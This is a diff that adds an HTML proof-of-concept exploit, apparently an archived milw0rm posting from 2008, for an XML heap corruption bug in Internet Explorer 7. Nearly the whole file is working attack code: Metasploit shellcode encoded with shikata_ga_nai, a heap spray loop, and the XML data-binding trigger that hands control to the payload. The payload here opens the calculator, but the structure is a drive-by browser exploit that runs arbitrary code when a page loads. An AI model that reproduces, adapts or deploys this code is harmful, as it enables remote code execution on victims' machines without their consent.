@@ -1,0 +1,48 @@
+<!--
+
+IE XML Heap Corruption exploit
+
+by krafty
+
+greets to hdm, ddz, SK, muts, halvar, grugq, and all the ethnical hackers
+
+sux to exploit traders - ZDI, WabiSabiLabi, and all you h0arders.
+
+Bring back the days of technotronic and r00tshell! Freedom.
+
+poc: launches calculator.
+Tested with IE7 XP SP2, SP3, Vista.
+
+-->
+
+<html>
+<div id="replace">x</div>
+<script>
+// windows/exec - 148 bytes
+// http://www.metasploit.com
+// Encoder: x86/shikata_ga_nai
+// EXITFUNC=process, CMD=calc.exe
+var shellcode = unescape("%uc92b%u1fb1%u0cbd%uc536%udb9b%ud9c5%u2474%u5af4%uea83%u31fc%u0b6a%u6a03%ud407%u6730%u5cff%u98bb%ud7ff%ua4fe%u9b74%uad05%u8b8b%u028d%ud893%ubccd%u35a2%u37b8%u4290%ua63a%u94e9%u9aa4%ud58d%ue5a3%u1f4c%ueb46%u4b8c%ud0ad%ua844%u524a%u3b81%ub80d%ud748%u4bd4%u6c46%u1392%u734a%u204f%uf86e%udc8e%ua207%u26b4%u04d4%ud084%uecba%u9782%u217c%ue8c0%uca8c%uf4a6%u4721%u0d2e%ua0b0%ucd2c%u00a8%ub05b%u43f4%u24e8%u7a9c%ubb85%u7dcb%ua07d%ued92%u09e1%u9631%u5580");
+
+// ugly heap spray, the d0nkey way!
+// works most of the time
+var spray = unescape("%u0a0a%u0a0a");
+
+do {
+   spray += spray;
+} while(spray.length < 0xd0000);
+
+memory = new Array();
+
+for(i = 0; i < 100; i++)
+   memory[i] = spray + shellcode;
+
+xmlcode = "<XML ID=I><X><C><![CDATA[<image SRC=http://&#x0a0a;&#x0a0a;.example.com>]]></C></X></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML><XML ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN></SPAN>";
+
+tag = document.getElementById("replace");
+tag.innerHTML = xmlcode;
+
+</script>
+</html>
+
+# milw0rm.com [2008-12-15]
